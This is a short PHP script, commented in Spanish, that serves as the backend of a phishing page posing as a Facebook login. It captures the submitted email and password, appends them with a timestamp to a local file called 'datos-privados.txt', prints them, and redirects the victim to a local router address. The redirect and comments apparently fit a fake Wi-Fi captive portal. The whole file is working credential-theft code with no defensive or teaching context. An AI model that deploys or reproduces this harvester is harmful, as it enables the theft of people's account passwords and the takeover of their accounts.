<?php
$file = 'datos-privados.txt';

// Recoge los datos del formulario (pueden llamarse distintos según tu plantilla)
$email = $_POST['email_facebook'] ?? 'desconocido';
$password = $_POST['password_facebook'] ?? 'desconocida';

// Registra la hora de captura
$fecha = date("Y-m-d H:i:s");

// Construye el texto a guardar y mostrar
$log = "[$fecha] [📩] Correo (Facebook): $email\n[$fecha] [🔑] Contraseña: $password\n\n";

// Guarda en archivo
file_put_contents($file, $log, FILE_APPEND);

// Muestra en consola
echo $log;

// Redirige al portal o página final
header("Refresh:0; url=http://192.168.1.1/");
exit();
?>
